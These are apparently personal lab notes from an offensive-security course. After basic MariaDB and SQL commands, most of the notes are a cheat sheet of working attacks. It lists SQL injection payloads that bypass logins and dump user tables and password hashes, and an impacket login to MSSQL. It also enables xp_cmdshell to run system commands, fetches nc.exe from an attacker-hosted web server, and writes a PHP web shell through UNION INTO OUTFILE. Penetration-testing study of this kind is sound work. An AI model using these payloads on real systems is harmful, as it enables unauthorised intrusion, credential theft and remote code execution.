```
sudo apt install mariadb-server
sudo mysql -u root -p password
show databases;
create database school;
```

```
SELECT * FROM Teachers;

SELECT * FROM Teachers WHERE Subject = 'Math';

UPDATE Teachers SET Subject = 'Math' WHERE TeacherID = 001;

SELECT Address FROM Teachers
UNION
SELECT Address FROM Students;

DELETE FROM Teachers WHERE TeacherID = 001;
```

`192.168.174.16/?debug=true`

Easy win
`offsec' OR 1=1 -- //`

Check Version
`' or 1=1 in (select @@version) -- //`

Grab Version
`' or 1=1 in (select @@version) -- //`

Grab all Users
`' OR 1=1 in (SELECT * FROM users) -- //`

Password Hashes
`' OR 1=1 in (SELECT password FROM users) -- //`

Grab Specific User Password
`' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`



`sudo python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py Administrator:Lab123@$IP -windows-auth`

```
execute sp_configure 'show advanced options', 1;  
reconfigure;  
execute sp_configure 'xp_cmdshell', 1;  
reconfigure;  
  
execute xp_cmdshell 'whoami';
```

`execute xp_cmdshell 'powershell.exe wget http://192.168.45.202/nc.exe -OutFile c:\\Users\\Public\\nc.exe`


```
python -m http.server 80
```


' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //